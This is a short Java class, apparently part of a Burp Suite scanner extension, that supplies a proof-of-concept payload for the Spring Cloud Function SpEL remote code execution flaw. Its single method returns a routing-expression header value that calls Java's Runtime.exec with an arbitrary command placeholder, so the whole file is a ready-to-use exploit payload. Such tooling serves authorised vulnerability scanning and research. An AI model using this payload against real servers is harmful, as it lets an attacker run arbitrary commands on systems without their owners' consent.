package burp.payload.pocs;

import burp.payload.IPoc;

/**
 * @author : metaStor
 * @date : Created 2022/4/9 10:06 PM
 * @description: Spring-Cloud-Function SpEL RCE
 * RCE POC
 */
public class POC5 implements IPoc {

    @Override
    public String genPoc() {
        return "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"%s\")";
    }
}
